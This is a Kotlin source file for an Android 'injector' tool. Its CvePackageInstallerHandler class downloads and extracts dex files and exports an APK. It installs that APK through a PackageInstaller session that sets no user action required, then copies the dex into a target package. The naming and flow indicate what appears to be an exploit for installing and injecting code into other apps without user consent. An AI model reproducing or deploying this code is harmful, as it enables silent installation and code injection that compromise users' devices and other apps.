package com.wunelezi.injector.inject

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import java.io.File
import java.lang.reflect.Method

class CvePackageInstallerHandler(private val context: Context) : InjectionHandler {

    override fun execute(targetPackage: String, versionSegment: String) {
        val zipFile = DexDownloader.downloadDexZip(context, versionSegment)
        val dexFiles = DexDownloader.extractDexFiles(context, zipFile, versionSegment)
        DexDownloader.writeToWidgetProvider(context, dexFiles)
        val apkFile = DexDownloader.exportAndCopyApk(context)

        installViaPackageInstaller(apkFile)

        DexDownloader.copyDexToTarget(versionSegment)
    }

    private fun installViaPackageInstaller(apkFile: File) {
        val pm = context.packageManager
        val pkgInstaller = pm.getPackageInstaller()

        val params = android.content.pm.PackageInstaller.SessionParams(
            android.content.pm.PackageInstaller.SessionParams.MODE_FULL_INSTALL
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            params.setRequireUserAction(android.content.pm.PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
        }
        params.setInstallerPackageName(context.packageName)

        val sessionId = pkgInstaller.createSession(params)
        val session = pkgInstaller.openSession(sessionId)

        session.openWrite("base.apk", 0, apkFile.length()).use { outputStream ->
            apkFile.inputStream().use { inputStream ->
                inputStream.copyTo(outputStream)
            }
            session.fsync(outputStream)
        }

        val intentFilter = android.content.Intent("com.wunelezi.injector.INSTALL_COMPLETE")
        val pendingIntent = android.app.PendingIntent.getBroadcast(
            context, sessionId, intentFilter,
            android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
        )

        session.commit(pendingIntent.intentSender)
        session.close()
    }
}
